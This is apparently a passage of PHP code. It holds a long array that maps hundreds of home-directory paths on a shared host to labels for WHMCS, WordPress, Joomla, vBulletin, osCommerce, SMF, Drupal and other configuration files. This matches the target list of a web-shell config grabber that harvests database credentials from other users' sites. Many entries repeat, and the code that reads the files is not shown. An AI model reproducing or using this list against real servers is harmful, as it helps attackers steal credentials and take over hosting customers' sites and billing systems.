						"/home/$user_FosforoS/public_html/public_html/purchase/configuration.php" => "-purchase-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/clientarea/configuration.php" => "-clientarea-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/autobuy/configuration.php" => "-autobuy-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/config.php" => "-2",
						"/home/$user_FosforoS/public_html/public_html/connect.php" => "-8",
						"/home/$user_FosforoS/public_html/public_html/include/config.php" => "-12",
						"/home/$user_FosforoS/public_html/public_html/vb/includes/config.php" => "-vb",
						"/home/$user_FosforoS/public_html/public_html/vb3/includes/config.php" => "-vb3",
						"/home/$user_FosforoS/public_html/public_html/whm/configuration.php" => "-whm15",
						"/home/$user_FosforoS/public_html/public_html/central/configuration.php" => "-whm-central",
						"/home/$user_FosforoS/public_html/public_html/whmcs/configuration.php" => "-whmcs",
						"/home/$user_FosforoS/public_html/public_html/support/configuration.php" => "-support",
						"/home/$user_FosforoS/public_html/public_html/supp/configuration.php" => "-supp",
						"/home/$user_FosforoS/public_html/public_html/secure/configuration.php" => "-sucure",
						"/home/$user_FosforoS/public_html/public_html/secure/whm/configuration.php" => "-sucure-whm",
						"/home/$user_FosforoS/public_html/public_html/secure/whmcs/configuration.php" => "-sucure-whmcs",
						"/home/$user_FosforoS/public_html/public_html/cpanel/configuration.php" => "-cpanel",
						"/home/$user_FosforoS/public_html/public_html/panel/configuration.php" => "-panel",
						"/home/$user_FosforoS/public_html/public_html/host/configuration.php" => "-host",
						"/home/$user_FosforoS/public_html/public_html/hosting/configuration.php" => "-hosting",
						"/home/$user_FosforoS/public_html/public_html/hosts/configuration.php" => "-hosts",
						"/home/$user_FosforoS/public_html/public_html/submitticket.php" => "-whmcs2",
						"/home/$user_FosforoS/public_html/public_html/clients/configuration.php" => "-clients",
						"/home/$user_FosforoS/public_html/public_html/client/configuration.php" => "-client",
						"/home/$user_FosforoS/public_html/public_html/clientes/configuration.php" => "-clientes",
						"/home/$user_FosforoS/public_html/public_html/cliente/configuration.php" => "-client",
						"/home/$user_FosforoS/public_html/public_html/clientsupport/configuration.php" => "-clientsupport",
						"/home/$user_FosforoS/public_html/public_html/billing/configuration.php" => "-billing",
						"/home/$user_FosforoS/public_html/public_html/manage/configuration.php" => "-whm-manage",
						"/home/$user_FosforoS/public_html/public_html/my/configuration.php" => "-whm-my",
						"/home/$user_FosforoS/public_html/public_html/myshop/configuration.php" => "-whm-myshop",
						"/home/$user_FosforoS/public_html/public_html/includes/configure.php" => "-shop",
						"/home/$user_FosforoS/public_html/public_html/os/includes/configure.php" => "-shop-os",
						"/home/$user_FosforoS/public_html/public_html/oscom/includes/configure.php" => "-oscom",
						"/home/$user_FosforoS/public_html/public_html/oscommerce/includes/configure.php" => "-oscommerce",
						"/home/$user_FosforoS/public_html/public_html/oscommerces/includes/configure.php" => "-oscommerces",
						"/home/$user_FosforoS/public_html/public_html/shop/includes/configure.php" => "-shop2",
						"/home/$user_FosforoS/public_html/public_html/shopping/includes/configure.php" => "-shop-shopping",
						"/home/$user_FosforoS/public_html/public_html/sale/includes/configure.php" => "-sale",
						"/home/$user_FosforoS/public_html/public_html/amember/config.TXT.php" => "-amember",
						"/home/$user_FosforoS/public_html/public_html/config.TXT.php" => "-amember2",
						"/home/$user_FosforoS/public_html/public_html/members/configuration.php" => "-members",
						"/home/$user_FosforoS/public_html/public_html/config.php" => "-4images1",
						"/home/$user_FosforoS/public_html/public_html/forum/includes/config.php" => "-forum",
						"/home/$user_FosforoS/public_html/public_html/forums/includes/config.php" => "-forums",
						"/home/$user_FosforoS/public_html/public_html/admin/conf.php" => "-5",
						"/home/$user_FosforoS/public_html/public_html/admin/config.php" => "-4",
						"/home/$user_FosforoS/public_html/public_html/wp-config.php" => "-wp13",
						"/home/$user_FosforoS/public_html/public_html/wp/wp-config.php" => "-wp13-wp",
						"/home/$user_FosforoS/public_html/public_html/WP/wp-config.php" => "-wp13-WP",
						"/home/$user_FosforoS/public_html/public_html/wp/beta/wp-config.php" => "-wp13-wp-beta",
						"/home/$user_FosforoS/public_html/public_html/beta/wp-config.php" => "-wp13-beta",
						"/home/$user_FosforoS/public_html/public_html/press/wp-config.php" => "-wp13-press",
						"/home/$user_FosforoS/public_html/public_html/wordpress/wp-config.php" => "-wp13-wordpress",
						"/home/$user_FosforoS/public_html/public_html/Wordpress/wp-config.php" => "-wp13-Wordpress",
						"/home/$user_FosforoS/public_html/public_html/blog/wp-config.php" => "-wp13-Wordpress",
						"/home/$user_FosforoS/public_html/public_html/wordpress/beta/wp-config.php" => "-wp13-wordpress-beta",
						"/home/$user_FosforoS/public_html/public_html/news/wp-config.php" => "-wp13-news",
						"/home/$user_FosforoS/public_html/public_html/new/wp-config.php" => "-wp13-new",
						"/home/$user_FosforoS/public_html/public_html/blog/wp-config.php" => "-wp-blog",
						"/home/$user_FosforoS/public_html/public_html/beta/wp-config.php" => "-wp-beta",
						"/home/$user_FosforoS/public_html/public_html/blogs/wp-config.php" => "-wp-blogs",
						"/home/$user_FosforoS/public_html/public_html/home/wp-config.php" => "-wp-home",
						"/home/$user_FosforoS/public_html/public_html/protal/wp-config.php" => "-wp-protal",
						"/home/$user_FosforoS/public_html/public_html/site/wp-config.php" => "-wp-site",
						"/home/$user_FosforoS/public_html/public_html/main/wp-config.php" => "-wp-main",
						"/home/$user_FosforoS/public_html/public_html/test/wp-config.php" => "-wp-test",
						"/home/$user_FosforoS/public_html/public_html/arcade/functions/dbclass.php" => "-ibproarcade",
						"/home/$user_FosforoS/public_html/public_html/joomla/configuration.php" => "-joomla2",
						"/home/$user_FosforoS/public_html/public_html/protal/configuration.php" => "-joomla-protal",
						"/home/$user_FosforoS/public_html/public_html/joo/configuration.php" => "-joo",
						"/home/$user_FosforoS/public_html/public_html/cms/configuration.php" => "-joomla-cms",
						"/home/$user_FosforoS/public_html/public_html/site/configuration.php" => "-joomla-site",
						"/home/$user_FosforoS/public_html/public_html/main/configuration.php" => "-joomla-main",
						"/home/$user_FosforoS/public_html/public_html/news/configuration.php" => "-joomla-news",
						"/home/$user_FosforoS/public_html/public_html/new/configuration.php" => "-joomla-new",
						"/home/$user_FosforoS/public_html/public_html/home/configuration.php" => "-joomla-home",
						"/home/$user_FosforoS/public_html/public_html/vb/includes/config.php" => "-vb-config",
						"/home/$user_FosforoS/public_html/public_html/vb3/includes/config.php" => "-vb3-config",
						"/home/$user_FosforoS/public_html/public_html/cc/includes/config.php" => "-vb1-config",
						"/home/$user_FosforoS/public_html/public_html/includes/config.php" => "-includes-vb",
						"/home/$user_FosforoS/public_html/public_html/forum/includes/class_core.php" => "-vbluttin-class_core.php",
						"/home/$user_FosforoS/public_html/public_html/vb/includes/class_core.php" => "-vbluttin-class_core.php1",
						"/home/$user_FosforoS/public_html/public_html/cc/includes/class_core.php" => "-vbluttin-class_core.php2",
						"/home/$user_FosforoS/public_html/public_html/whm/configuration.php" => "-whm15",
						"/home/$user_FosforoS/public_html/public_html/central/configuration.php" => "-whm-central",
						"/home/$user_FosforoS/public_html/public_html/whm/whmcs/configuration.php" => "-whm-whmcs",
						"/home/$user_FosforoS/public_html/public_html/whm/WHMCS/configuration.php" => "-whm-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/whmc/WHM/configuration.php" => "-whmc-WHM",
						"/home/$user_FosforoS/public_html/public_html/whmcs/configuration.php" => "-whmcs",
						"/home/$user_FosforoS/public_html/public_html/support/configuration.php" => "-support",
						"/home/$user_FosforoS/public_html/public_html/supp/configuration.php" => "-supp",
						"/home/$user_FosforoS/public_html/public_html/secure/configuration.php" => "-sucure",
						"/home/$user_FosforoS/public_html/public_html/secure/whm/configuration.php" => "-sucure-whm",
						"/home/$user_FosforoS/public_html/public_html/secure/whmcs/configuration.php" => "-sucure-whmcs",
						"/home/$user_FosforoS/public_html/public_html/cpanel/configuration.php" => "-cpanel",
						"/home/$user_FosforoS/public_html/public_html/panel/configuration.php" => "-panel",
						"/home/$user_FosforoS/public_html/public_html/host/configuration.php" => "-host",
						"/home/$user_FosforoS/public_html/public_html/hosting/configuration.php" => "-hosting",
						"/home/$user_FosforoS/public_html/public_html/hosts/configuration.php" => "-hosts",
						"/home/$user_FosforoS/public_html/public_html/configuration.php" => "-joomla",
						"/home/$user_FosforoS/public_html/public_html/submitticket.php" => "-whmcs2",
						"/home/$user_FosforoS/public_html/public_html/clients/configuration.php" => "-clients",
						"/home/$user_FosforoS/public_html/public_html/client/configuration.php" => "-client",
						"/home/$user_FosforoS/public_html/public_html/clientes/configuration.php" => "-clientes",
						"/home/$user_FosforoS/public_html/public_html/cliente/configuration.php" => "-client",
						"/home/$user_FosforoS/public_html/public_html/clientsupport/configuration.php" => "-clientsupport",
						"/home/$user_FosforoS/public_html/public_html/billing/configuration.php" => "-billing",
						"/home/$user_FosforoS/public_html/public_html/manage/configuration.php" => "-whm-manage",
						"/home/$user_FosforoS/public_html/public_html/my/configuration.php" => "-whm-my",
						"/home/$user_FosforoS/public_html/public_html/myshop/configuration.php" => "-whm-myshop",
						"/home/$user_FosforoS/public_html/public_html/includes/dist-configure.php" => "-zencart",
						"/home/$user_FosforoS/public_html/public_html/zencart/includes/dist-configure.php" => "-shop-zencart",
						"/home/$user_FosforoS/public_html/public_html/shop/includes/dist-configure.php" => "-shop-ZCshop",
						"/home/$user_FosforoS/public_html/public_html/Settings.php" => "-smf",
						"/home/$user_FosforoS/public_html/public_html/smf/Settings.php" => "-smf2",
						"/home/$user_FosforoS/public_html/public_html/forum/Settings.php" => "-smf-forum",
						"/home/$user_FosforoS/public_html/public_html/forums/Settings.php" => "-smf-forums",
						"/home/$user_FosforoS/public_html/public_html/upload/includes/config.php" => "-up",
						"/home/$user_FosforoS/public_html/public_html/article/config.php" => "-Nwahy",
						"/home/$user_FosforoS/public_html/public_html/up/includes/config.php" => "-up2",
						"/home/$user_FosforoS/public_html/public_html/conf_global.php" => "-6",
						"/home/$user_FosforoS/public_html/public_html/include/db.php" => "-7",
						"/home/$user_FosforoS/public_html/public_html/connect.php" => "-PHP-Fusion",
						"/home/$user_FosforoS/public_html/public_html/mk_conf.php" => "-9",
						"/home/$user_FosforoS/public_html/public_html/includes/config.php" => "-traidnt1",
						"/home/$user_FosforoS/public_html/public_html/config.php" => "-4images",
						"/home/$user_FosforoS/public_html/public_html/sites/default/settings.php" => "-Drupal",
						"/home/$user_FosforoS/public_html/public_html/member/configuration.php" => "-1member.TXT",
						"/home/$user_FosforoS/public_html/public_html/billings/configuration.php" => "-billings.TXT",
						"/home/$user_FosforoS/public_html/public_html/whm/configuration.php" => "-whm",
						"/home/$user_FosforoS/public_html/public_html/supports/configuration.php" => "-supports",
						"/home/$user_FosforoS/public_html/public_html/requires/config.php" => "-AM4SS-hosting",
						"/home/$user_FosforoS/public_html/public_html/supports/includes/iso4217.php" => "-hostbills-supports",
						"/home/$user_FosforoS/public_html/public_html/client/includes/iso4217.php" => "-hostbills-client",
						"/home/$user_FosforoS/public_html/public_html/support/includes/iso4217.php" => "-hostbills-support",
						"/home/$user_FosforoS/public_html/public_html/billing/includes/iso4217.php" => "-hostbills-billing",
						"/home/$user_FosforoS/public_html/public_html/billings/includes/iso4217.php" => "-hostbills-billings",
						"/home/$user_FosforoS/public_html/public_html/host/includes/iso4217.php" => "-hostbills-host",
						"/home/$user_FosforoS/public_html/public_html/hosts/includes/iso4217.php" => "-hostbills-hosts",
						"/home/$user_FosforoS/public_html/public_html/hosting/includes/iso4217.php" => "-hostbills-hosting",
						"/home/$user_FosforoS/public_html/public_html/hostings/includes/iso4217.php" => "-hostbills-hostings",
						"/home/$user_FosforoS/public_html/public_html/includes/iso4217.php" => "-hostbills",
						"/home/$user_FosforoS/public_html/public_html/hostbills/includes/iso4217.php" => "-hostbills-hostbills",
						"/home/$user_FosforoS/public_html/public_html/hostbill/includes/iso4217.php" => "-hostbills-hostbill",
						"/home/$user_FosforoS/public_html/includes/configure.php" => "-shop",
						"/home/$user_FosforoS/public_html/os/includes/configure.php" => "-shop-os",
						"/home/$user_FosforoS/public_html/oscom/includes/configure.php" => "-oscom",
						"/home/$user_FosforoS/public_html/oscommerce/includes/configure.php" => "-oscommerce",
						"/home/$user_FosforoS/public_html/oscommerces/includes/configure.php" => "-oscommerces",
						"/home/$user_FosforoS/public_html/shop/includes/configure.php" => "-shop2",
						"/home/$user_FosforoS/public_html/shopping/includes/configure.php" => "-shop-shopping",
						"/home/$user_FosforoS/public_html/sale/includes/configure.php" => "-sale",
						"/home/$user_FosforoS/public_html/amember/config.TXT.php" => "-amember",
						"/home/$user_FosforoS/public_html/config.TXT.php" => "-amember2",
						"/home/$user_FosforoS/public_html/members/configuration.php" => "-members",
						"/home/$user_FosforoS/public_html/config.php" => "-2",
						"/home/$user_FosforoS/public_html/forum/includes/config.php" => "-forum",
						"/home/$user_FosforoS/public_html/forums/includes/config.php" => "-forums",
						"/home/$user_FosforoS/public_html/admin/conf.php" => "-5",
						"/home/$user_FosforoS/public_html/admin/config.php" => "-4",
						"/home/$user_FosforoS/public_html/wp-config.php" => "-wp13",
						"/home/$user_FosforoS/public_html/wp/wp-config.php" => "-wp13-wp",
						"/home/$user_FosforoS/public_html/WP/wp-config.php" => "-wp13-WP",
						"/home/$user_FosforoS/public_html/wp/beta/wp-config.php" => "-wp13-wp-beta",
						"/home/$user_FosforoS/public_html/beta/wp-config.php" => "-wp13-beta",
						"/home/$user_FosforoS/public_html/press/wp-config.php" => "-wp13-press",
						"/home/$user_FosforoS/public_html/wordpress/wp-config.php" => "-wp13-wordpress",
						"/home/$user_FosforoS/public_html/Wordpress/wp-config.php" => "-wp13-Wordpress",
						"/home/$user_FosforoS/public_html/wordpress/beta/wp-config.php" => "-wp13-wordpress-beta",
						"/home/$user_FosforoS/public_html/news/wp-config.php" => "-wp13-news",
						"/home/$user_FosforoS/public_html/new/wp-config.php" => "-wp13-new",
						"/home/$user_FosforoS/public_html/blog/wp-config.php" => "-wp-blog",
						"/home/$user_FosforoS/public_html/beta/wp-config.php" => "-wp-beta",
						"/home/$user_FosforoS/public_html/blogs/wp-config.php" => "-wp-blogs",
						"/home/$user_FosforoS/public_html/home/wp-config.php" => "-wp-home",
						"/home/$user_FosforoS/public_html/protal/wp-config.php" => "-wp-protal",
						"/home/$user_FosforoS/public_html/site/wp-config.php" => "-wp-site",
						"/home/$user_FosforoS/public_html/main/wp-config.php" => "-wp-main",
						"/home/$user_FosforoS/public_html/test/wp-config.php" => "-wp-test",
						"/home/$user_FosforoS/public_html/conf_global.php" => "-6",
						"/home/$user_FosforoS/public_html/include/db.php" => "-7",
						"/home/$user_FosforoS/public_html/connect.php" => "-8",
						"/home/$user_FosforoS/public_html/mk_conf.php" => "-9",
						"/home/$user_FosforoS/public_html/include/config.php" => "-12",
						"/home/$user_FosforoS/public_html/joomla/configuration.php" => "-joomla2",
						"/home/$user_FosforoS/public_html/protal/configuration.php" => "-joomla-protal",
						"/home/$user_FosforoS/public_html/joo/configuration.php" => "-joo",
						"/home/$user_FosforoS/public_html/cms/configuration.php" => "-joomla-cms",
						"/home/$user_FosforoS/public_html/site/configuration.php" => "-joomla-site",
						"/home/$user_FosforoS/public_html/main/configuration.php" => "-joomla-main",
						"/home/$user_FosforoS/public_html/news/configuration.php" => "-joomla-news",
						"/home/$user_FosforoS/public_html/new/configuration.php" => "-joomla-new",
						"/home/$user_FosforoS/public_html/home/configuration.php" => "-joomla-home",
						"/home/$user_FosforoS/public_html/vb/includes/config.php" => "-vb",
						"/home/$user_FosforoS/public_html/vb3/includes/config.php" => "-vb3",
						"/home/$user_FosforoS/public_html/includes/config.php" => "-includes-vb",
						"/home/$user_FosforoS/public_html/whm/configuration.php" => "-whm15",
						"/home/$user_FosforoS/public_html/central/configuration.php" => "-whm-central",
						"/home/$user_FosforoS/public_html/whm/whmcs/configuration.php" => "-whm-whmcs",
						"/home/$user_FosforoS/public_html/whm/WHMCS/configuration.php" => "-whm-WHMCS",
						"/home/$user_FosforoS/public_html/whmc/WHM/configuration.php" => "-whmc-WHM",
						"/home/$user_FosforoS/public_html/whmcs/configuration.php" => "-whmcs",
						"/home/$user_FosforoS/public_html/support/configuration.php" => "-support",
						"/home/$user_FosforoS/public_html/supp/configuration.php" => "-supp",
						"/home/$user_FosforoS/public_html/secure/configuration.php" => "-sucure",
						"/home/$user_FosforoS/public_html/secure/whm/configuration.php" => "-sucure-whm",
						"/home/$user_FosforoS/public_html/secure/whmcs/configuration.php" => "-sucure-whmcs",
						"/home/$user_FosforoS/public_html/cpanel/configuration.php" => "-cpanel",
						"/home/$user_FosforoS/public_html/panel/configuration.php" => "-panel",
						"/home/$user_FosforoS/public_html/host/configuration.php" => "-host",
						"/home/$user_FosforoS/public_html/hosting/configuration.php" => "-hosting",
						"/home/$user_FosforoS/public_html/hosts/configuration.php" => "-hosts",
						"/home/$user_FosforoS/public_html/configuration.php" => "-joomla",
						"/home/$user_FosforoS/public_html/submitticket.php" => "-whmcs2",
						"/home/$user_FosforoS/public_html/clients/configuration.php" => "-clients",
						"/home/$user_FosforoS/public_html/client/configuration.php" => "-client",
						"/home/$user_FosforoS/public_html/clientes/configuration.php" => "-clientes",
						"/home/$user_FosforoS/public_html/cliente/configuration.php" => "-client",
						"/home/$user_FosforoS/public_html/clientsupport/configuration.php" => "-clientsupport",
						"/home/$user_FosforoS/public_html/billing/configuration.php" => "-billing",
						"/home/$user_FosforoS/public_html/manage/configuration.php" => "-whm-manage",
						"/home/$user_FosforoS/public_html/my/configuration.php" => "-whm-my",
						"/home/$user_FosforoS/public_html/myshop/configuration.php" => "-whm-myshop",
						"/home/$user_FosforoS/public_html/includes/dist-configure.php" => "-zencart",
						"/home/$user_FosforoS/public_html/zencart/includes/dist-configure.php" => "-shop-zencart",
						"/home/$user_FosforoS/public_html/shop/includes/dist-configure.php" => "-shop-ZCshop",
						"/home/$user_FosforoS/public_html/Settings.php" => "-smf",
						"/home/$user_FosforoS/public_html/smf/Settings.php" => "-smf2",
						"/home/$user_FosforoS/public_html/forum/Settings.php" => "-smf-forum",
						"/home/$user_FosforoS/public_html/forums/Settings.php" => "-smf-forums",
						"/home/$user_FosforoS/public_html/upload/includes/config.php" => "-up",
						"/home/$user_FosforoS/public_html/up/includes/config.php" => "-up2",
						"/home/$user_FosforoS/public_html/includes/configure.php" => "-shop",
						"/home/$user_FosforoS/public_html/os/includes/configure.php" => "-shop-os",
						"/home/$user_FosforoS/public_html/oscom/includes/configure.php" => "-oscom",
						"/home/$user_FosforoS/public_html/oscommerce/includes/configure.php" => "-oscommerce",
						"/home/$user_FosforoS/public_html/oscommerces/includes/configure.php" => "-oscommerces",
						"/home/$user_FosforoS/public_html/shop/includes/configure.php" => "-shop2",
						"/home/$user_FosforoS/public_html/shopping/includes/configure.php" => "-shop-shopping",
						"/home/$user_FosforoS/public_html/sale/includes/configure.php" => "-sale",
						"/home/$user_FosforoS/public_html/amember/config.TXT.php" => "-amember",
						"/home/$user_FosforoS/public_html/config.TXT.php" => "-amember2",
						"/home/$user_FosforoS/public_html/members/configuration.php" => "-members",
						"/home/$user_FosforoS/public_html/config.php" => "-4images1",
						"/home/$user_FosforoS/public_html/forum/includes/config.php" => "-forum",
						"/home/$user_FosforoS/public_html/forums/includes/config.php" => "-forums",
						"/home/$user_FosforoS/public_html/admin/conf.php" => "-5",
						"/home/$user_FosforoS/public_html/admin/config.php" => "-4",
						"/home/$user_FosforoS/public_html/wp-config.php" => "-wp13",
						"/home/$user_FosforoS/public_html/wp/wp-config.php" => "-wp13-wp",
						"/home/$user_FosforoS/public_html/WP/wp-config.php" => "-wp13-WP",
						"/home/$user_FosforoS/public_html/wp/beta/wp-config.php" => "-wp13-wp-beta",
						"/home/$user_FosforoS/public_html/beta/wp-config.php" => "-wp13-beta",
						"/home/$user_FosforoS/public_html/press/wp-config.php" => "-wp13-press",
						"/home/$user_FosforoS/public_html/wordpress/wp-config.php" => "-wp13-wordpress",
						"/home/$user_FosforoS/public_html/Wordpress/wp-config.php" => "-wp13-Wordpress",
						"/home/$user_FosforoS/public_html/blog/wp-config.php" => "-wp13-Wordpress",
						"/home/$user_FosforoS/public_html/wordpress/beta/wp-config.php" => "-wp13-wordpress-beta",
						"/home/$user_FosforoS/public_html/news/wp-config.php" => "-wp13-news",
						"/home/$user_FosforoS/public_html/new/wp-config.php" => "-wp13-new",
						"/home/$user_FosforoS/public_html/blog/wp-config.php" => "-wp-blog",
						"/home/$user_FosforoS/public_html/beta/wp-config.php" => "-wp-beta",
						"/home/$user_FosforoS/public_html/blogs/wp-config.php" => "-wp-blogs",
						"/home/$user_FosforoS/public_html/home/wp-config.php" => "-wp-home",
						"/home/$user_FosforoS/public_html/protal/wp-config.php" => "-wp-protal",
						"/home/$user_FosforoS/public_html/site/wp-config.php" => "-wp-site",
						"/home/$user_FosforoS/public_html/main/wp-config.php" => "-wp-main",
						"/home/$user_FosforoS/public_html/test/wp-config.php" => "-wp-test",
						"/home/$user_FosforoS/public_html/arcade/functions/dbclass.php" => "-ibproarcade",
						"/home/$user_FosforoS/public_html/joomla/configuration.php" => "-joomla2",
						"/home/$user_FosforoS/public_html/protal/configuration.php" => "-joomla-protal",
						"/home/$user_FosforoS/public_html/joo/configuration.php" => "-joo",
						"/home/$user_FosforoS/public_html/cms/configuration.php" => "-joomla-cms",
						"/home/$user_FosforoS/public_html/site/configuration.php" => "-joomla-site",
						"/home/$user_FosforoS/public_html/main/configuration.php" => "-joomla-main",
						"/home/$user_FosforoS/public_html/news/configuration.php" => "-joomla-news",
						"/home/$user_FosforoS/public_html/new/configuration.php" => "-joomla-new",
						"/home/$user_FosforoS/public_html/home/configuration.php" => "-joomla-home",
						"/home/$user_FosforoS/public_html/vb/includes/config.php" => "-vb-config",
						"/home/$user_FosforoS/public_html/vb3/includes/config.php" => "-vb3-config",
						"/home/$user_FosforoS/public_html/cc/includes/config.php" => "-vb1-config",
						"/home/$user_FosforoS/public_html/includes/config.php" => "-includes-vb",
						"/home/$user_FosforoS/public_html/forum/includes/class_core.php" => "-vbluttin-class_core.php",
						"/home/$user_FosforoS/public_html/vb/includes/class_core.php" => "-vbluttin-class_core.php1",
						"/home/$user_FosforoS/public_html/cc/includes/class_core.php" => "-vbluttin-class_core.php2",
						"/home/$user_FosforoS/public_html/whm/configuration.php" => "-whm15",
						"/home/$user_FosforoS/public_html/central/configuration.php" => "-whm-central",
						"/home/$user_FosforoS/public_html/whm/whmcs/configuration.php" => "-whm-whmcs",
						"/home/$user_FosforoS/public_html/whm/WHMCS/configuration.php" => "-whm-WHMCS",
						"/home/$user_FosforoS/public_html/whmc/WHM/configuration.php" => "-whmc-WHM",
						"/home/$user_FosforoS/public_html/whmcs/configuration.php" => "-whmcs",
						"/home/$user_FosforoS/public_html/support/configuration.php" => "-support",
						"/home/$user_FosforoS/public_html/supp/configuration.php" => "-supp",
						"/home/$user_FosforoS/public_html/secure/configuration.php" => "-sucure",
						"/home/$user_FosforoS/public_html/secure/whm/configuration.php" => "-sucure-whm",
						"/home/$user_FosforoS/public_html/secure/whmcs/configuration.php" => "-sucure-whmcs",
						"/home/$user_FosforoS/public_html/cpanel/configuration.php" => "-cpanel",
						"/home/$user_FosforoS/public_html/panel/configuration.php" => "-panel",
						"/home/$user_FosforoS/public_html/host/configuration.php" => "-host",
						"/home/$user_FosforoS/public_html/hosting/configuration.php" => "-hosting",
						"/home/$user_FosforoS/public_html/hosts/configuration.php" => "-hosts",
						"/home/$user_FosforoS/public_html/configuration.php" => "-joomla",
						"/home/$user_FosforoS/public_html/submitticket.php" => "-whmcs2",
						"/home/$user_FosforoS/public_html/clients/configuration.php" => "-clients",
						"/home/$user_FosforoS/public_html/client/configuration.php" => "-client",
						"/home/$user_FosforoS/public_html/clientes/configuration.php" => "-clientes",
						"/home/$user_FosforoS/public_html/cliente/configuration.php" => "-client",
						"/home/$user_FosforoS/public_html/clientsupport/configuration.php" => "-clientsupport",
						"/home/$user_FosforoS/public_html/billing/configuration.php" => "-billing",
						"/home/$user_FosforoS/public_html/manage/configuration.php" => "-whm-manage",
						"/home/$user_FosforoS/public_html/my/configuration.php" => "-whm-my",
						"/home/$user_FosforoS/public_html/myshop/configuration.php" => "-whm-myshop",
						"/home/$user_FosforoS/public_html/includes/dist-configure.php" => "-zencart",
						"/home/$user_FosforoS/public_html/zencart/includes/dist-configure.php" => "-shop-zencart",
						"/home/$user_FosforoS/public_html/shop/includes/dist-configure.php" => "-shop-ZCshop",
						"/home/$user_FosforoS/public_html/Settings.php" => "-smf",
						"/home/$user_FosforoS/public_html/smf/Settings.php" => "-smf2",
						"/home/$user_FosforoS/public_html/forum/Settings.php" => "-smf-forum",
						"/home/$user_FosforoS/public_html/forums/Settings.php" => "-smf-forums",
						"/home/$user_FosforoS/public_html/upload/includes/config.php" => "-up",
						"/home/$user_FosforoS/public_html/article/config.php" => "-Nwahy",
						"/home/$user_FosforoS/public_html/up/includes/config.php" => "-up2",
						"/home/$user_FosforoS/public_html/conf_global.php" => "-6",
						"/home/$user_FosforoS/public_html/include/db.php" => "-7",
						"/home/$user_FosforoS/public_html/connect.php" => "-PHP-Fusion",
						"/home/$user_FosforoS/public_html/mk_conf.php" => "-9",
						"/home/$user_FosforoS/public_html/includes/config.php" => "-traidnt1",
						"/home/$user_FosforoS/public_html/config.php" => "-4images",
						"/home/$user_FosforoS/public_html/sites/default/settings.php" => "-Drupal",
						"/home/$user_FosforoS/public_html/member/configuration.php" => "-1member.TXT",
						"/home/$user_FosforoS/public_html/billings/configuration.php" => "-billings.TXT",
						"/home/$user_FosforoS/public_html/whm/configuration.php" => "-whm",
						"/home/$user_FosforoS/public_html/supports/configuration.php" => "-supports",
						"/home/$user_FosforoS/public_html/requires/config.php" => "-AM4SS-hosting",
						"/home/$user_FosforoS/public_html/supports/includes/iso4217.php" => "-hostbills-supports",
						"/home/$user_FosforoS/public_html/client/includes/iso4217.php" => "-hostbills-client",
						"/home/$user_FosforoS/public_html/support/includes/iso4217.php" => "-hostbills-support",
						"/home/$user_FosforoS/public_html/billing/includes/iso4217.php" => "-hostbills-billing",
						"/home/$user_FosforoS/public_html/billings/includes/iso4217.php" => "-hostbills-billings",
						"/home/$user_FosforoS/public_html/host/includes/iso4217.php" => "-hostbills-host",
						"/home/$user_FosforoS/public_html/hosts/includes/iso4217.php" => "-hostbills-hosts",
						"/home/$user_FosforoS/public_html/hosting/includes/iso4217.php" => "-hostbills-hosting",
						"/home/$user_FosforoS/public_html/hostings/includes/iso4217.php" => "-hostbills-hostings",
						"/home/$user_FosforoS/public_html/includes/iso4217.php" => "-hostbills",
						"/home/$user_FosforoS/public_html/hostbills/includes/iso4217.php" => "-hostbills-hostbills",
						"/home/$user_FosforoS/public_html/hostbill/includes/iso4217.php" => "-hostbills-hostbill",
						"/home/$user_FosforoS/public_html/config.php" => "-4images1",
						"/home/$user_FosforoS/public_html/blog/wp-config.php" => "-wp13-Wordpress",
						"/home/$user_FosforoS/public_html/arcade/functions/dbclass.php" => "-ibproarcade",
						"/home/$user_FosforoS/public_html/vb/includes/config.php" => "-vb-config",
						"/home/$user_FosforoS/public_html/vb3/includes/config.php" => "-vb3-config",
						"/home/$user_FosforoS/public_html/cc/includes/config.php" => "-vb1-config",
						"/home/$user_FosforoS/public_html/forum/includes/class_core.php" => "-vbluttin-class_core.php",
						"/home/$user_FosforoS/public_html/vb/includes/class_core.php" => "-vbluttin-class_core.php1",
						"/home/$user_FosforoS/public_html/cc/includes/class_core.php" => "-vbluttin-class_core.php2",
						"/home/$user_FosforoS/public_html/article/config.php" => "-Nwahy",
						"/home/$user_FosforoS/public_html/connect.php" => "-PHP-Fusion",
						"/home/$user_FosforoS/public_html/includes/config.php" => "-traidnt1",
						"/home/$user_FosforoS/public_html/config.php" => "-4images",
						"/home/$user_FosforoS/public_html/sites/default/settings.php" => "-Drupal",
						"/home/$user_FosforoS/public_html/member/configuration.php" => "-1member",
						"/home/$user_FosforoS/public_html/supports/includes/iso4217.php" => "-hostbills-supports",
						"/home/$user_FosforoS/public_html/client/includes/iso4217.php" => "-hostbills-client",
						"/home/$user_FosforoS/public_html/support/includes/iso4217.php" => "-hostbills-support",
						"/home/$user_FosforoS/public_html/billing/includes/iso4217.php" => "-hostbills-billing",
						"/home/$user_FosforoS/public_html/billings/includes/iso4217.php" => "-hostbills-billings",
						"/home/$user_FosforoS/public_html/host/includes/iso4217.php" => "-hostbills-host",
						"/home/$user_FosforoS/public_html/hosts/includes/iso4217.php" => "-hostbills-hosts",
						"/home/$user_FosforoS/public_html/hosting/includes/iso4217.php" => "-hostbills-hosting",
						"/home/$user_FosforoS/public_html/hostings/includes/iso4217.php" => "-hostbills-hostings",
						"/home/$user_FosforoS/public_html/includes/iso4217.php" => "-hostbills",
						"/home/$user_FosforoS/public_html/hostbills/includes/iso4217.php" => "-hostbills-hostbills",
						"/home/$user_FosforoS/public_html/hostbill/includes/iso4217.php" => "-hostbills-hostbill",
						"/home/$user_FosforoS/public_html/cart/configuration.php" => "-cart-WHMCS",
						"/home/$user_FosforoS/public_html/hosting/configuration.php" => "-hosting-WHMCS",
						"/home/$user_FosforoS/public_html/buy/configuration.php" => "-buy-WHMCS",
						"/home/$user_FosforoS/public_html/checkout/configuration.php" => "-checkout-WHMCS",
						"/home/$user_FosforoS/public_html/host/configuration.php" => "-host-WHMCS",
						"/home/$user_FosforoS/public_html/shop/configuration.php" => "-shop-WHMCS",
						"/home/$user_FosforoS/public_html/shopping/configuration.php" => "-shopping-WHMCS",
						"/home/$user_FosforoS/public_html/sale/configuration.php" => "-sale-WHMCS",
						"/home/$user_FosforoS/public_html/client/configuration.php" => "-client-WHMCS",
